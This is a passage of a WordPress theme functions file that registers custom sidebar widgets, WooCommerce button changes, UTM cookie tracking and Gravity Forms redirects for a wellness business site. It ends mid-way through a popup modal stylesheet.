          $('.' + button_id + '_img').attr('src', attachment.url);
          $('.' + button_id + '_url').val(attachment.url);
        } else {
          return _orig_send_attachment.apply($('#' + button_id), [props, attachment]);
        }
      }
      wp.media.editor.open($('#' + button_id));
      return false;
    });
  }
  media_upload('.js_custom_upload_media');
});
    </script>
<?php
    }

}


function Download_Ebook_widget_sidebar_widget() {
    register_widget( 'Download_Ebook_widget' );
}
add_action( 'widgets_init', 'Download_Ebook_widget_sidebar_widget' );





class Audio_Programs_widget extends WP_Widget {

	function __construct() {
		parent::__construct(
		  
		// Base ID of your widget
		'Audio_Programs_widget', 
		  
		// Widget name will appear in UI
		__('BWS Audio Programs Widget', 'Audio_Programs_widget_domain'), 
		  
		// Widget description
		array( 'description' => __( 'Audio Programs Widget', 'Audio_Programs_widget_domain' ), ) 
		);
	}

	function widget($args, $instance) {
        echo $before_widget;
?>

	<div class="grid-x grid-margin-x grid-margin-y sidebar-cta programs-widget">
				<div class="cell item large-12 medium-12 small-12">
					<div class="grid-x">
						<div class="cell large-12 item">
							<img src="<?php echo esc_url($instance['image_uri']);?>" style="width:100%;"/>
							<div class="inner">								
								<p><?php echo apply_filters('widget_title', $instance['text'] ); ?> <strong><?php echo apply_filters('widget_title', $instance['sub_text'] ); ?></strong></p>
								
							</div>													
						</div>
						<div class="cell large-12">
							<a href="<?php echo site_url();?>/shop" class="button"><?php echo apply_filters('widget_title', $instance['button_text'] ); ?></a>
						</div>
					</div>
				</div>
			</div>

<?php
        echo $after_widget;

    }

    function update($new_instance, $old_instance) {
        $instance = $old_instance;
        $instance['text'] = strip_tags( $new_instance['text'] );
        $instance['sub_text'] = strip_tags( $new_instance['sub_text'] );
        $instance['button_text'] = strip_tags( $new_instance['button_text'] );
        $instance['image_uri'] = strip_tags( $new_instance['image_uri'] );
        return $instance;
    }

    

	function form($instance) {
?>

    <p>
        <label for="<?php echo $this->get_field_id('text'); ?>">Title</label><br />
        <input type="text" name="<?php echo $this->get_field_name('text'); ?>" id="<?php echo $this->get_field_id('text'); ?>" value="<?php echo $instance['text']; ?>" class="widefat" />
    </p>
    <p>
        <label for="<?php echo $this->get_field_id('sub_text'); ?>">Sub Title</label><br />
        <input type="text" name="<?php echo $this->get_field_name('sub_text'); ?>" id="<?php echo $this->get_field_id('sub_text'); ?>" value="<?php echo $instance['sub_text']; ?>" class="widefat" />
    </p>
    <p>
        <label for="<?php echo $this->get_field_id('button_text'); ?>">CTA Button Text</label><br />
        <input type="text" name="<?php echo $this->get_field_name('button_text'); ?>" id="<?php echo $this->get_field_id('button_text'); ?>" value="<?php echo $instance['button_text']; ?>" class="widefat" />
    </p>
    <p>
        <label for="<?= $this->get_field_id( 'image_uri' ); ?>">Image</label>
        <img class="<?= $this->id ?>_img" src="<?= (!empty($instance['image_uri'])) ? $instance['image_uri'] : ''; ?>" style="margin:0;padding:0;max-width:100%;display:block;width:100%;"/>
        <input type="hidden" class="widefat <?= $this->id ?>_url" name="<?= $this->get_field_name( 'image_uri' ); ?>" value="<?= $instance['image_uri']; ?>" style="margin-top:5px;" />
        <input type="button" id="<?= $this->id ?>" class="button button-primary js_custom_upload_media" value="Upload Image" style="margin-top:5px;" />
    </p>
    <script type="text/javascript">
    		    	jQuery(document).ready(function ($) {
  function media_upload(button_selector) {
    var _custom_media = true,
        _orig_send_attachment = wp.media.editor.send.attachment;
    $('body').on('click', button_selector, function () {
      var button_id = $(this).attr('id');
      wp.media.editor.send.attachment = function (props, attachment) {
        if (_custom_media) {
          $('.' + button_id + '_img').attr('src', attachment.url);
          $('.' + button_id + '_url').val(attachment.url);
        } else {
          return _orig_send_attachment.apply($('#' + button_id), [props, attachment]);
        }
      }
      wp.media.editor.open($('#' + button_id));
      return false;
    });
  }
  media_upload('.js_custom_upload_media');
});
    </script>
<?php
    }

}



function Audio_Programs_widget_sidebar_widget() {
    register_widget( 'Audio_Programs_widget' );
}
add_action( 'widgets_init', 'Audio_Programs_widget_sidebar_widget' );



class BWS_Services_widget extends WP_Widget {

	function __construct() {
		parent::__construct(
		  
		// Base ID of your widget
		'BWS_Services_widget', 
		  
		// Widget name will appear in UI
		__('BWS Services Widget', 'BWS_Services_widget_domain'), 
		  
		// Widget description
		array( 'description' => __( 'BWS Services Widget', 'BWS_Services_widget_domain' ), ) 
		);
	}

	function widget($args, $instance) {
        echo $before_widget;
?>
	<?php $services = get_field('services_sitewide','option'); ?>
	<style type="text/css">
		@media (max-width:1024px){
				.sidebar-services p{
					font-size:20px;

				}
			}

		@media (width:1024px){
				.sidebar-services p{
					left:45px;
					
				}
			}
		@media (width:667px){
				.sidebar-services p{
					left:45px !important;
					
				}
			}
		@media (max-width:768px) and (min-width:568px){
				.sidebar-services p{
					    left: 72px;
					
				}
			}

		@media (max-width:1024px) and (min-width:835px){
			.sidebar-services p{
				    left: 36px;
    			font-size: 13px;
			}
		}

		@media (max-width:834px) and (min-width:769px){
			.sidebar-services p{
				    left: 73px;
				font-size: 23px;
			}
		}

		@media (width:568px){
			.sidebar-cta p{
				font-size: 3.188rem;
				padding-right: 41px;
			}
		}
	</style>

	<div class="grid-x grid-margin-x grid-margin-y sidebar-services">
		<div class="cell"><h3 class="sidebar-panel-title">How Can <strong>We Help You</strong></h3></div>
		<?php foreach($services as $service): ?>
			<div class="cell small-12 medium-12 large-6 item" onClick="redirectto('<?php echo $service['page_url'];?>')">
				
					<img src="<?php echo $service['background_image'];?>" style="width:100%;"/>
					<p><?php echo $service['title'];?></p>
					
			</div>
		<?php endforeach; ?>
	</div>
	<script type="text/javascript">
		function redirectto(url){
			window.location.href= url;
			return false;
		}
	</script>
<?php
        echo $after_widget;

    }

    	function form($instance) {
?>
	<?php $services = get_field('services_sitewide','option'); ?>

	<div class="grid-x grid-margin-x grid-margin-y sidebar-services">
		<div class="cell"><h3 class="sidebar-panel-title">How Can <strong>We Help You</strong></h3></div>
		<?php foreach($services as $service): ?>
			<div class="cell large-6 medium-6 large-6 item" onClick="redirectto('<?php echo $service['page_url'];?>')">
				
					<img src="<?php echo $service['background_image'];?>" style="width:100%;"/>
					<p><?php echo $service['title'];?></p>
					
			</div>
		<?php endforeach; ?>
	</div>

		<p>Manage the items <a href="<?php echo admin_url("admin.php?page=acf-options");?>">Here</a> </p>
   		
<?php
    }	

}

function BWS_Services_widget_sidebar_widget() {
    register_widget( 'BWS_Services_widget' );
}
add_action( 'widgets_init', 'BWS_Services_widget_sidebar_widget' );



class BWS_Video_Testimonials_widget extends WP_Widget {

	function __construct() {
		parent::__construct(
		  
		// Base ID of your widget
		'BWS_Video_Testimonials_widget', 
		  
		// Widget name will appear in UI
		__('BWS Video Testimonials Widget', 'BWS_Video_Testimonials_widget_domain'), 
		  
		// Widget description
		array( 'description' => __( 'BWS Video Testimonials Widget', 'BWS_Video_Testimonials_widget_domain' ), ) 
		);
	}

	function widget($args, $instance) {
        echo $before_widget;
?>
	<?php $video_testimonials = get_field('video_testimonials','option');?>

		<style type="text/css">
			.youtube {
			  background-color: #000;
			  margin-bottom: 30px;
			  position: relative;
			  padding-top: 56.25%;
			  overflow: hidden;
			  cursor: pointer; }

			.youtube img {
			  width: 100%;
			  top: -16.82%;
			  left: 0;
			  opacity: 0.7; }

			.youtube .play-button {
			  width: 71px;
			  height: 71px;
			  z-index: 1;
			  background: url(<?php echo get_template_directory_uri();?>/assets/images/small-play-icon.png) no-repeat; }

			.youtube img,
			.youtube .play-button {
			  cursor: pointer; }

			.youtube img,
			.youtube iframe,
			.youtube .play-button,
			.youtube .play-button:before {
			  position: absolute; }

			.youtube .play-button,
			.youtube .play-button:before {
			  top: 50%;
			  left: 50%;
			  transform: translate3d(-50%, -50%, 0); }

			.youtube iframe {
			  height: 100%;
			  width: 100%;
			  top: 0;
			  left: 0; }
		</style>

		<div class="grid-x grid-margin-x video-testimonials-sidebar">
			<div class="cell"><h3 class="sidebar-panel-title">What <strong>They Are Saying</strong></h3></div>
			<?php foreach($video_testimonials as $vt): ?>
				<div class="cell large-12">
					<div class="youtube" data-embed="<?php echo $vt['video_id'];?>">
						<div class="play-button"></div>
						<img src="https://img.youtube.com/vi/<?php echo $vt['video_id'];?>/sddefault.jpg" style="width: 100%;"/>
					</div>
				</div>
			<?php endforeach; ?>
		</div>
<?php
        echo $after_widget;

    }

    	function form($instance) {
?>
		<?php $video_testimonials = get_field('video_testimonials','option');?>

		<style type="text/css">
			.youtube {
			  background-color: #000;
			  margin-bottom: 30px;
			  position: relative;
			  padding-top: 56.25%;
			  overflow: hidden;
			  cursor: pointer; }

			.youtube img {
			  width: 100%;
			  top: -16.82%;
			  left: 0;
			  opacity: 0.7; }

			.youtube .play-button {
			  width: 101px;
			  height: 101px;
			  z-index: 1;
			  background: url(<?php echo get_template_directory_uri();?>/assets/images/video-play-button.png) no-repeat; }

			.youtube img,
			.youtube .play-button {
			  cursor: pointer; }

			.youtube img,
			.youtube iframe,
			.youtube .play-button,
			.youtube .play-button:before {
			  position: absolute; }

			.youtube .play-button,
			.youtube .play-button:before {
			  top: 50%;
			  left: 50%;
			  transform: translate3d(-50%, -50%, 0); }

			.youtube iframe {
			  height: 100%;
			  width: 100%;
			  top: 0;
			  left: 0; }
		</style>

		<div class="grid-x grid-margin-x grid-margin-y video-testimonials-sidebar">
			<div class="cell"><h3 class="sidebar-panel-title">What <strong>They Are Saying</strong></h3></div>
			<?php foreach($video_testimonials as $vt): ?>
				<div class="cell large-12">
					<div class="youtube" data-embed="<?php echo $vt['video_id'];?>">
						<div class="play-button"></div>
						<img src="https://img.youtube.com/vi/<?php echo $vt['video_id'];?>/sddefault.jpg" style="width: 100%;"/>
					</div>
				</div>
			<?php endforeach; ?>
		</div>
		<script type="text/javascript">
			jQuery(document).ready(function($){
				$('.play-button').click(function(){
		loadLazyVideos();
	});


	function setClickResponseFunction(vidDiv) {
	    var embedSrc;
	    if (vidDiv.dataset.vidhost === "vimeo") {
	        embedSrc = "https://player.vimeo.com/video/" + vidDiv.dataset.embed + "?autoplay=1";
	    } else {
	        embedSrc = "https://www.youtube.com/embed/" + vidDiv.dataset.embed + "?rel=0&showinfo=0&autoplay=1";
	    } 
	    
	    vidDiv.addEventListener( "click", function() {
	        var iframe = document.createElement( "iframe" );

	        iframe.setAttribute( "frameborder", "0" );
	        iframe.setAttribute( "allowfullscreen", "" );
	        iframe.setAttribute( "src", embedSrc );

	        this.innerHTML = "";
	        this.appendChild( iframe );
	    } );
	}

	function loadLazyVideos() {
	    var youtube = document.querySelectorAll( ".youtube" );
	    
	    for (var i = 0; i < youtube.length; i++) {
	        setClickResponseFunction(youtube[i]);
	    }
	}

	window.onload = function() {
	  loadLazyVideos();
	};
			});
		</script>
		<p>Manage the videos <a href="<?php echo admin_url("admin.php?page=acf-options");?>">Here</a> </p>
   		
<?php
    }	

}


function BWS_Video_Testimonials_widget_sidebar_widget() {
    register_widget( 'BWS_Video_Testimonials_widget' );
}
add_action( 'widgets_init', 'BWS_Video_Testimonials_widget_sidebar_widget' );


function BWS_Posts_widget_sidebar_widget() {
    register_widget( 'BWS_Posts_widget' );
}
add_action( 'widgets_init', 'BWS_Posts_widget_sidebar_widget' );

class BWS_Posts_widget extends WP_Widget {
 
	function __construct() {
		parent::__construct(
		 
		// Base ID of your widget
		'BWS_Posts_widget', 
		 
		// Widget name will appear in UI
		__('BWS Posts Widget', 'BWS_Posts_widget_domain'), 
		 
		// Widget description
		array( 'description' => __( 'Sample widget for Duyfken', 'BWS_Posts_widget_domain' ), ) 
		);

	}
 
	// Creating widget front-end
	 
	public function widget( $args, $instance ) {
		$title = apply_filters( 'widget_title', $instance['title'] );

		if ( isset( $instance[ 'number_of_recent_post' ] ) ) {
			$number_of_recent_post = $instance['number_of_recent_post'];
			
		}
		else {
			$number_of_recent_post = 5;
		}
	 	

	 	if ( isset( $instance[ 'number_of_products' ] ) ) {
			$number_of_products = $instance['number_of_products'];
			
		}
		else {
			$number_of_products = 5;
		}

		// before and after widget arguments are defined by themes
		echo $args['before_widget'];
		if ( ! empty( $title ) )
			echo $args['before_title'] . $title . $args['after_title'];
	 
		// This is where you run the code and display the output
		

		?>
		<style type="text/css">
			.sidebar .widget{
				padding:0px;
			}
			.sidebar-post-title h3{
				line-height: 0.9;
				margin: 10px 0px;
			}
			.sidebar-post-title h3 > a{
				font-size: 18px;
				font-weight: bold;
				color: #005caa;
			}
			.sidebar-post-item{
				min-height: 140px;
				border-bottom: 1px solid #f2f2f2;
				display: flex;
				align-items: center;
			}
			.sidebar-post-panel {
				border: 1px solid #005caa;
			}
			.sidebar-post-item:last-child{
				border-bottom:0px!important;
			}
			.sidebar-readmore{
				display:block;
				color:#005caa;
				font-family: 'Montserrat';
			}
			.sidebar-posts .tabs-title{
				background-color:#ffffff;
				width: 50%;
				text-align: center;
				border: 1px solid #005caa;
			}
			.sidebar-posts .tabs-title a{
				font-family: 'Montserrat';
				font-weight: bold;
				font-size: 20px;
				padding: 18px;
				color: #005caa;
				height:100%;
			}
			.sidebar-posts .is-active a{
				background:#005caa!important;
			}
			.sidebar-posts .tabs-title.is-active a{
				color:#ffffff;
			}
			ul.sidebar-posts{
				display:flex;
				justify-content: space-evenly;
				margin-bottom: -2px;
			}
			

		</style>

		<div class="grid-x">
			<div class="cell">

				<ul class="tabs sidebar-posts" data-tabs id="example-tabs">
						
						<li class="tabs-title"><a data-tabs-target="panel2" href="#panel2" aria-selected="true">Popular Posts</a></li>
						<li class="tabs-title is-active"><a href="#panel1">Recent Posts</a></li>
					</ul>

					<div class="tabs-content" data-tabs-content="example-tabs">
						<div class="tabs-panel is-active sidebar-post-panel" id="panel1">
							<?php $the_query = new WP_Query( 'posts_per_page=5' ); ?>									
							<?php while ($the_query -> have_posts()) : $the_query -> the_post(); ?>
									<div class="grid-x grid-margin-x sidebar-post-item item-container">
										<div class="cell f-img small-6"><a href="<?php the_permalink(); ?>"><?php the_post_thumbnail('blog-sidebar-featured'); ?></a></div>
										<div class="cell small-6 sidebar-post-title"><h3><a href="<?php the_permalink(); ?>">

											<?php $title = get_the_title(); 

											$title_array = explode(" ",$title);
											$title_new = array();
											$idx=0;
											foreach($title_array as $ta){
												if($idx<7){
													$title_new[] = $ta;
													$idx++;
												}
											}

											echo implode(" ",$title_new)."...";
											?>
												

											</a>

										</h3>
											<a href="<?php the_permalink(); ?>" class="sidebar-readmore">Read more »</a>
										</div>
									</div>	
							<?php 
								endwhile;
								wp_reset_postdata();
							?>								 
						</div>						
						<div class="tabs-panel sidebar-post-panel" id="panel2">

							<?php $popular = new WP_Query(array('posts_per_page'=>5, 'meta_key'=>'popular_posts', 'orderby'=>'meta_value_num', 'order'=>'DESC'));
											while ($popular->have_posts()) : $popular->the_post(); ?>
												<div class="grid-x grid-margin-x sidebar-post-item item-container">
												<div class="cell f-img small-6"><a href="<?php the_permalink(); ?>"><?php the_post_thumbnail('blog-sidebar-featured'); ?></a></div>
												<div class="cell small-6 sidebar-post-title"><h3><a href="<?php the_permalink(); ?>"><?php $title = get_the_title(); 

											$title_array = explode(" ",$title);
											$title_new = array();
											$idx=0;
											foreach($title_array as $ta){
												if($idx<7){
													$title_new[] = $ta;
													$idx++;
												}
											}

											echo implode(" ",$title_new)."...";
											?></a></h3>
											<a href="<?php the_permalink(); ?>" class="sidebar-readmore">Read more »</a>
													</div>
												</div>
											<?php endwhile; wp_reset_postdata(); ?>
						</div>
					</div>
				
						

				
			</div>
		</div>

		<?php


		echo isset($args['after_widget']) ? $args['after_widget'] : "";
	}
         
	// Widget Backend 
	public function form( $instance ) {
		if ( isset( $instance[ 'title' ] ) ) {
			$title = $instance[ 'title' ];
			
		}
		else {
			$title = __( 'New title', 'wpb_widget_domain' );
		}

		if ( isset( $instance[ 'number_of_recent_post' ] ) ) {
			$number_of_recent_post = $instance['number_of_recent_post'];
			
		}
		else {
			$number_of_recent_post = 5;
		}

		if ( isset( $instance[ 'number_of_products' ] ) ) {
			$number_of_products = $instance['number_of_products'];
			
		}
		else {
			$number_of_products = 5;
		}
		
		


		// Widget admin form
		?>
			<p>
				<label for="<?php echo $this->get_field_id( 'number_of_recent_post' ); ?>"><?php _e( 'Number of Recent Post:' ); ?></label> 
				<input class="widefat" id="<?php echo $this->get_field_id( 'number_of_recent_post' ); ?>" name="<?php echo $this->get_field_name( 'number_of_recent_post' ); ?>" type="text" value="<?php echo esc_attr( $number_of_recent_post ); ?>" />
			</p>
		<?php 
	}
     
	// Updating widget replacing old instances with new
	public function update( $new_instance, $old_instance ) {
		$instance = array();
		$instance['title'] = ( ! empty( $new_instance['title'] ) ) ? strip_tags( $new_instance['title'] ) : '';
		$instance['number_of_recent_post'] = ( ! empty( $new_instance['number_of_recent_post'] ) ) ? strip_tags( $new_instance['number_of_recent_post'] ) : '';
		$instance['number_of_products'] = ( ! empty( $new_instance['number_of_products'] ) ) ? strip_tags( $new_instance['number_of_products'] ) : ''; 
		return $instance;
	}
} // Class wpb_widget ends here


function _popular_posts($post_id) {
    $count_key = 'popular_posts';
    $count = get_post_meta($post_id, $count_key, true);
    if ($count == '') {
        $count = 0;
        delete_post_meta($post_id, $count_key);
        add_post_meta($post_id, $count_key, '0');
    } else {
        $count++;
        update_post_meta($post_id, $count_key, $count);
    }
}


function _track_posts($post_id) {
    if (!is_single()) return;
    if (empty($post_id)) {
        global $post;
        $post_id = $post->ID;
    }
    _popular_posts($post_id);
}
add_action('wp_head', '_track_posts');
/*
add_filter( 'woocommerce_product_add_to_cart_text', 'woocommerce_custom_product_add_to_cart_text' );  
function woocommerce_custom_product_add_to_cart_text() {
    return __( 'Access with Membership', 'woocommerce' );
}
add_filter( 'woocommerce_product_single_add_to_cart_text', 'woocommerce_custom_single_add_to_cart_text' ); 
function woocommerce_custom_single_add_to_cart_text() {
    return __( 'Access with Membership', 'woocommerce' ); 
}
//remove_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_add_to_cart' );
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart', 30 );
//add_action('woocommerce_after_shop_loop_item',function(){
	//echo '<a href="https://brainwellnessspa.com.au/membership" data-quantity="1" class="button" rel="nofollow">Access with Membership</a>';
//},100);
add_action('woocommerce_single_product_summary',function(){
	echo '<a href="https://brainwellnessspa.com.au/membership" data-quantity="1" class="button" rel="nofollow">Access with Membership</a>';
},100);
*/
function wpb_demo_shortcode() { 
 
// Things that you want to do. 
$message = 'Hello world!'; 
 
// Output needs to be return
return $message;
} 
// register shortcode
add_shortcode('greeting', 'wpb_demo_shortcode'); 


add_filter( 'woocommerce_product_add_to_cart_text', 'woocommerce_custom_product_add_to_cart_text' );  
function woocommerce_custom_product_add_to_cart_text() {
    return __( 'Access with Membership', 'woocommerce' );
}
add_filter( 'woocommerce_product_single_add_to_cart_text', 'woocommerce_custom_single_add_to_cart_text' ); 
function woocommerce_custom_single_add_to_cart_text() {
    return __( 'Access with Membership', 'woocommerce' ); 
}
//remove_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_add_to_cart' );
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart', 30 );
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_price', 10 );
//add_action('woocommerce_after_shop_loop_item',function(){
	//echo '<a href="https://brainwellnessspa.com.au/membership" data-quantity="1" class="button" rel="nofollow">Access with Membership</a>';
//},100);
add_action('woocommerce_single_product_summary',function(){
	echo '<a href="https://brainwellnessspa.com.au/membership" data-quantity="1" class="button" rel="nofollow">Access with Membership</a>';
},100);
		

//Code by TORNEDO 11-09-2020

function my_custom_js() {
?>
<script>
/*! js-cookie v3.0.0-rc.0 | MIT */
!function(e,t){"object"==typeof exports&&"undefined"!=typeof module?module.exports=t():"function"==typeof define&&define.amd?define(t):(e=e||self,function(){var r=e.Cookies,n=e.Cookies=t();n.noConflict=function(){return e.Cookies=r,n}}())}(this,function(){"use strict";function e(e){for(var t=1;t<arguments.length;t++){var r=arguments[t];for(var n in r)e[n]=r[n]}return e}var t={read:function(e){return e.replace(/%3B/g,";")},write:function(e){return e.replace(/;/g,"%3B")}};return function r(n,i){function o(r,o,u){if("undefined"!=typeof document){"number"==typeof(u=e({},i,u)).expires&&(u.expires=new Date(Date.now()+864e5*u.expires)),u.expires&&(u.expires=u.expires.toUTCString()),r=t.write(r).replace(/=/g,"%3D"),o=n.write(String(o),r);var c="";for(var f in u)u[f]&&(c+="; "+f,!0!==u[f]&&(c+="="+u[f].split(";")[0]));return document.cookie=r+"="+o+c}}return Object.create({set:o,get:function(e){if("undefined"!=typeof document&&(!arguments.length||e)){for(var r=document.cookie?document.cookie.split("; "):[],i={},o=0;o<r.length;o++){var u=r[o].split("="),c=u.slice(1).join("="),f=t.read(u[0]).replace(/%3D/g,"=");if(i[f]=n.read(c,f),e===f)break}return e?i[e]:i}},remove:function(t,r){o(t,"",e({},r,{expires:-1}))},withAttributes:function(t){return r(this.converter,e({},this.attributes,t))},withConverter:function(t){return r(e({},this.converter,t),this.attributes)}},{attributes:{value:Object.freeze(i)},converter:{value:Object.freeze(n)}})}(t,{path:"/"})});
</script>
<script>
	
	var values = [ 'utm_source','utm_medium','utm_term', 'utm_content', 'utm_campaign', 'gclid','fbclid', 'track_url', 'source'];
	//query params
	function getUrlVar() {
		var vars = {};
		var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
			vars[key] = value;
		});
		return vars;
	}
	
	//check url and remove old data
	var url = window.location.href;
	var arr = url.split('?');
	if(url.length > 1 && arr[1] !== '') {
		var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
			Cookies.remove('utm_source');Cookies.remove('utm_medium');Cookies.remove('utm_term');Cookies.remove('utm_content');Cookies.remove('utm_campaign');Cookies.remove('gclid');Cookies.remove('track_url');Cookies.remove('fbclid');Cookies.remove('source');
		});
	}
	
	var vars = getUrlVar();
	//value check
	function CheckVar(v,qvars){
		if (qvars[v] != undefined) {
			return qvars[v]
		}
		return ''
	}
	//set data in coockie
	jQuery.each(values, function( i,v ) {
        var cookie_field = CheckVar(v,vars);
        if(v == 'utm_source'){
			Cookies.set('source', cookie_field, { expires: 30 });	
		}
		else if(v == 'fbclid'){
			if(cookie_field != ''){
				Cookies.set('source', 'facebook', { expires: 30 });
			}
		}
		
		if(cookie_field != ''){
			Cookies.set(v, cookie_field, { expires: 30 });
		}
    });
	
	
	//fetch and set data from coockie
	function RecreateUrl(staticparam){
		var coockie = Cookies.get();
		var result = {};
		var is_track = 0;
		jQuery.each(coockie, function(key,val) {
            if(jQuery.inArray(key, values)  >  -1){
				if(key == 'track_url'){
					if(val == ''){
						result[key] = staticparam;
					}
					else{
						result[key] = val;
					}
					is_track = 1;
				}
				else{
					if(val != ''){
						result[key] = val;
					}
				}
			}
        });
		if(is_track == 0){
			result['track_url'] = staticparam;
		}
		var out = [];
		for (var key in result) {
			if (result.hasOwnProperty(key)) {
				out.push(key + '=' + encodeURIComponent(result[key]));
			}
		}
		var data = out.join('&');
		var final_url = "https://brainwellnessspa.com.au/bookings/services.php?"+data;
		
		return final_url;

		//return "<?php echo get_field('panel_cta_button_url','option');?>";
		
	}
	
	
	//fetch and set data from coockie
	function RecreateUrl_red(staticparam,urlparam,url){
		var coockie = Cookies.get();
		var result = {};
		var is_track = 0;
		jQuery.each(coockie, function(key,val) {
            if(jQuery.inArray(key, values)  >  -1){
				if(key == 'track_url'){
					if(val == ''){
						result[key] = staticparam;
					}
					else{
						result[key] = val;
					}
					is_track = 1;
				}
				else{
					if(val != ''){
						result[key] = val;
					}
				}
			}
        });
		if(is_track == 0){
			result['track_url'] = staticparam;
		}
		var out = [];
		for (var key in result) {
			if (result.hasOwnProperty(key)) {
				out.push(key + '=' + encodeURIComponent(result[key]));
			}
		}
		var data = out.join('&');
		var final_url = url+"?"+urlparam+"&"+data;
		console.log(final_url);
		return final_url;
		
	}
	
	
	
	
	//disable right click on element
	jQuery("#home_button").contextmenu(function () { return false; });
	jQuery("#em-button").contextmenu(function () { return false; });
	jQuery(".btn-member").contextmenu(function () { return false; });
	
	//click event buttons
	jQuery("#home_button").click(function(e){
		if (e.ctrlKey) {
			return false;
		}
		var static_param = 'Home-Page-Button';
		var newUrl = RecreateUrl(static_param);
		window.location.href = newUrl;
		return false;
    });
	jQuery("#em-button").click(function(e){
		if (e.ctrlKey) {
			return false;
		}
		var static_param = 'Emotional-Empowerment-Page-Button';
		var newUrl = RecreateUrl(static_param);
		window.location.href = newUrl;
		return false;
    });
	
	jQuery(document).on( "click", ".btn-member", function(e) {
		if (e.ctrlKey) {
			return false;
		}
		var static_param = 'Membership-button';
		var url = jQuery(this).attr('data-href');
		var arr = url.split('?');
		var url_data = arr[1];
		console.log(arr);
		var newUrl = RecreateUrl_red(static_param,arr[1],arr[0]);
		window.location.href = newUrl;
		return false;
    });
	
	
</script>


<?php    
}
add_action( 'wp_footer', 'my_custom_js' );

//var values = [ 'utm_source','utm_medium','utm_term', 'utm_content', 'utm_campaign', 'gclid','fbclid', 'track_url'];

/* SET UTM VALUE TO GFORM */
add_filter( 'gform_field_value_utm_source', 'populate_utm_source' );
function populate_utm_source( $value ) {
   return $_COOKIE['utm_source'];
}

add_filter( 'gform_field_value_utm_medium', 'populate_utm_medium' );
function populate_utm_medium( $value ) {
   return $_COOKIE['utm_medium'];
}

add_filter( 'gform_field_value_utm_term', 'populate_utm_term' );
function populate_utm_term( $value ) {
   return $_COOKIE['utm_term'];
}

add_filter( 'gform_field_value_utm_content', 'populate_utm_content' );
function populate_utm_content( $value ) {
   return $_COOKIE['utm_content'];
}

add_filter( 'gform_field_value_utm_campaign', 'populate_utm_campaign' );
function populate_utm_campaign( $value ) {
   return $_COOKIE['utm_campaign'];
}

add_filter( 'gform_field_value_source', 'populate_source' );
function populate_source( $value ) {
   return $_COOKIE['source'];
}


add_filter( 'gform_confirmation', 'custom_confirmation', 10, 4 );
function custom_confirmation( $confirmation, $form, $entry, $ajax ) {	
	
    if( $form['id'] == '35' || $form['id'] == '25' || $form['id'] == '26' || $form['id'] == '24' || $form['id'] == '27' || $form['id'] == '28' || $form['id'] == '29' || $form['id'] == '30' || $form['id'] == '32' || $form['id'] == '31' || $form['id'] == '33' || $form['id'] == '34') {
		
		$bid = 'MzI4MzQ4XzMyODU0OQ==';
		$name = explode(" ",rgar( $entry, '2' ));
		$body = array(
			'inf_field_FirstName' => $name[0],
			'inf_field_LastName' => $name[1],
			'inf_field_Email' => rgar( $entry, '3' ),
			'inf_field_Phone1' => rgar( $entry, '4' ),
			'utm_campaign' => rgar( $entry, '6' ),
			'utm_source' => rgar( $entry, '7' ),
			'utm_medium' => rgar( $entry, '8' ),
			'utm_term' => rgar( $entry, '9' ),
			'utm_content' => rgar( $entry, '10' ),
			'source' => rgar( $entry, '11' ),
			'bId' => $bid
		);
		//$confirmation = array( 'redirect' => 'https://brainwellnessspa.com.au/bookings/services.php?'.http_build_query($body));
		$url = 'https://brainwellnessspa.com.au/bookings/services.php?'.http_build_query($body);
		$confirmation .= "<h4>Thanks! Redirecting you to the booking form now....</h4><script>
				jQuery( document ).ready(function() {
					window.dataLayer = window.dataLayer || [];
					window.dataLayer.push({
					 'event': 'gravityFormSubmit',
					 'label': 'gform_".$form['id']."'
					});
					setTimeout(function(){ window.location.replace('".$url."'); }, 1000);
					
				});
			</script>";
	}
	if($form['id'] == '43' || $form['id'] == '44')
	{
		$body = array(
			'email' => rgar( $entry, '2' ),
			'phone' => rgar( $entry, '3' ),
			'name' => rgar( $entry, '1')

		);
		$url = 'https://brainwellnessspa.com.au/expaudio/consumer-details.php?'.http_build_query($body);
		$confirmation .= "<script>
		jQuery( document ).ready(function() {
					window.dataLayer = window.dataLayer || [];
					window.dataLayer.push({
					 'event': 'gravityFormSubmit',
					 'label': 'gform_".$form['id']."'
					});
		setTimeout(function(){ window.location.replace('".$url."'); }, 1000);
		});
		</script>";
	} 
    return $confirmation;
}
 

 // The shortcode function
function popup_modal_global() { 

	if($_GET['test']=='test')
	{
 
?>
	<style>
    #ouibounce-modal {
      	display: none;  
    }
  
    .overlay {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: rgba(0, 0, 0, 0.4);
        background: 	url(data:;base64,iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAYAAABytg0kAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAABl0RVh0U29mdHdhcmUAUGFpbnQuTkVUIHYzLjUuNUmK/OAAAAATSURBVBhXY2RgYNgHxGAAYuwDAA78AjwwRoQYAAAAAElFTkSuQmCC) repeat fixed transparent\9;
        z-index: 9998;
        color: #fff;
        transition: opacity 500ms;
    }
  
    .content h2 {
        font-size: 17pt;
        color: #777;
    }

    .popup {
        margin: 0px;
        padding: 20px;
        z-index: 9999;    
        padding-bottom: 0px;
        text-align: left;
        height: 450px;
        background: #fff;
        border-radius: 5px;
        width: 700px;
        position: fixed;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
        color: #000;
    }

    .popup .closePopupCross {
        position: absolute;
        top: -20px;
        right: -20px;
        transition: all 200ms;
        font-size: 30px;
        font-weight: bold;
        text-decoration: none;
        color: #fff; z-index: 999;
    }
  
    .form-group {
    	padding-top: 20px;    
    }
  
    .help-block {
    	font-size: 10pt;
    	color: #C71585;
    }
  
    .popup .closePopupLink {
	font-size: 11pt;
    	color: #aaa;
    	margin-left: 30px;
    }  
    /*css editpopup*/
    .exitmodelpopup .modal-dialog { max-width: 700px; }
button.close { position: absolute;  right: -21px; top: -20px; color: #fff; font-size: 35px; z-index: 999; opacity: 1; }
